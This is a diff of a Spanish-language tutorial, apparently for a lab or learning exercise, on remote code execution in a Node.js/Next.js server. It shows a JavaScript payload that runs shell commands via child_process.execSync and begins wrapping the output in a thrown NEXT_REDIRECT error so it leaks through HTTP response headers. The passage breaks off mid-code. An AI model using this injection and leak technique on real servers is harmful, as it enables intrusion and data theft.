@@ -43,20 +43,21 @@ Usaremos `curl` para enviar esta petición.
 > *   **¿Dónde lo ejecuto?** Tienes que abrir la terminal de tu sistema operativo (Terminal en Linux/Mac, o PowerShell/CMD en Windows). **NO** se ejecuta en la consola del navegador.
 > *   **¿Tengo que instalar algo?** `curl` suele venir preinstalado. Puedes verificarlo escribiendo `curl --version` en tu terminal. Si ves una versión, ¡estás listo!
 
-### Paso 3.1: El Comando
-Queremos ejecutar un cálculo matemático simple para probar el RCE: `1337 * 2`.
-En Node.js, podemos usar `child_process`:
+### Paso 3.1: El Comando Conceptualmente
+ **¡No ejecutes esto en ninguna terminal!**
+ Este es el código JavaScript que **enviaremos dentro** de nuestra petición `curl`. Lo analizamos aquí para entender qué hará el servidor cuando lo reciba.
+
+ Queremos que el servidor ejecute un cálculo matemático simple: `1337 * 2`.
+ El código que inyectaremos se ve así:
 
 ```javascript
-/* Solo para análisis - No ejecutar esto directamente en node */
+/* ESTE CÓDIGO VA DENTRO DEL CURL (Payload) */
 var output = process.mainModule.require('child_process').execSync('echo $((1337*2))').toString().trim();
 ```
 
 ### Paso 3.2: Exfiltrando el Resultado
-No podemos ver la consola del servidor fácilmente. Necesitamos que el servidor nos **envíe el resultado de vuelta**.
-La vulnerabilidad explota un tipo de error específico (`NEXT_REDIRECT`) para filtrar datos en las cabeceras de respuesta HTTP.
-
-Envolvemos nuestro código para lanzar este error con nuestro `output`:
+Además de ejecutar el cálculo, necesitamos que el servidor nos **envíe el resultado de vuelta**.
+Envolvemos el código anterior para "lanzar" un error que contenga nuestro resultado:
 
 ```javascript
 throw Object.assign(new Error('NEXT_REDIRECT'), {
